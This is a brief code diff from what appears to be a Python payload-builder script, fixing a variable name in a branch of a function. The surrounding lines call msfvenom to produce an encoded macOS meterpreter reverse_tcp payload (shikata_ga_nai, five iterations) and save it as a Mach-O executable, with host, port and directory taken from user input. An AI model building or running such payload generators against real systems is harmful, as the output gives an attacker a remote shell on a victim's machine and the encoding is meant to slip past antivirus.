@@ -140,7 +140,7 @@ def mac(namder):
         subprocess.check_output(
             f'msfvenom -p osx/x64/meterpreter/reverse_tcp lhost={host} lport={port} -e x86/shikata_ga_nai -i 5 -f macho > {directory}{name}.macho')
     
-    elif name == 2:
+    elif namder == 2:
         port = int(input('lport: '))
         directory = str(input('dir: '))
         b = list(directory)
